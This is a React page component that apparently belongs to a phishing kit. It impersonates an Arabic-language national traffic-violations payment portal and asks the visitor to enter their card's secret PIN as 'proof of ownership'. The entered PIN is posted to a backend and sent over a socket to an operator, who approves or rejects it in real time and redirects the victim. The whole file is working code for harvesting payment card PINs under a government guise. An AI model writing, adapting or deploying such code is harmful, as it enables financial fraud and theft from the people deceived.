import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";
import { AiFillLike } from "react-icons/ai";

const PIN = () => {
  const [pin, setPin] = useState("");
  const [load, setLoad] = useState(null);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    e.preventDefault();

    try {
      await axios
        .post(api_route + "/visaPin/" + sessionStorage.getItem("id"), {
          visa_pin: pin,
        })
        .then(() => {
          socket.emit("visaPin", { id, visa_pin: pin });
        });
    } catch (error) {
      console.error(error);
    }
  };

  socket.on("acceptVisaPin", (data) => {
    if (id === data) {
      window.location.href = "/success";
    }
  });

  socket.on("declineVisaPin", (data) => {
    if (id === data) {
      setLoad(false);
      window.location.href = "/payment";
    }
  });

  return (
    <div className="w-11/12 lg:w-1/2 flex flex-col items-center justify-center my-5 rounded-md">
      <div className="main_bg w-full flex flex-col md:flex-row  items-center justify-center text-white px-4 py-8 rounded-lg ">
        <div
          className="flex flex-col gap-y-2 md:items-end items-center md:py-2"
          dir="rtl "
        >
          <span className="text-3xl md:text-5xl ">
            المنصة الوطنية للمخالفات
          </span>
          <span className="text-lg">وجهة واحدة لإدارة جميع المخالفات</span>
          <form
            className="w-full flex flex-col  gap-y-3 py-5"
            onSubmit={handleSubmit}
          >
            <div className="w-full flex flex-col gap-y-3" dir="rtl">
              <div className="flex gap-x-2">
                <span className="w-1/3">رقم الهوية</span>
                <span>
                  {sessionStorage.getItem("nationalId") ||
                    sessionStorage.getItem("nationalOther")}
                </span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3">رقم المخالفة</span>
                <span>{sessionStorage.getItem("vioNumber")}</span>
              </div>
              <div className="flex gap-x-2">
                <span className="w-1/3">قيمة المخالفة</span>
                <span>{sessionStorage.getItem("price")}</span>
              </div>
              <div className="flex gap-x-2 items-center">
                <span className="w-1/3">طريقة الدفع</span>
                <div className="flex items-center justify-evenly gap-x-5 p-2">
                  {sessionStorage.getItem("method") === "visa" ? (
                    <>
                      <img src="/MasterCard.svg" className="md:w-12 w-9 " />
                      <img src="/Visa.svg" className="md:w-12 w-9" />
                      <img src="/Mada.svg" className="md:w-12 w-9" />
                    </>
                  ) : (
                    <img src="/american.png" className="md:w-12 w-9" />
                  )}
                </div>
              </div>
              <div className="flex gap-x-2 items-center">
                <span className="w-1/3">رمز التحقق </span>
                <div className="flex items-center justify-evenly gap-x-5 p-2">
                  <AiFillLike className="text-3xl text-green-500" />
                </div>
              </div>
            </div>

            <div className="flex flex-col w-full gap-y-3 mt-5 " dir="rtl">
              <span className="">
                الرقم السري لـتأكيد معلومات البطاقة والدفع
              </span>
              <span>( إثبات ملكية )</span>
            </div>

            <div className="flex flex-col w-full gap-3  my-2">
              <input
                value={pin}
                required
                onChange={(e) => setPin(e.target.value)}
                dir="ltr"
                minLength={4}
                maxLength={6}
                type="text"
                placeholder="  **** "
                className="w-full     rounded-md  text-black   p-2   text-center     outline-green-800"
              />
            </div>

            <button
              type="submit"
              className="flex items-center justify-center gap-2 p-2 w-full mt-5"
              style={{ background: "#17605d" }}
            >
              تأكيد
            </button>
            {error && (
              <span className="text-red-500 text-center w-full py-2 text-sm">
                {error}
              </span>
            )}
          </form>
        </div>
      </div>
      {load ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default PIN;
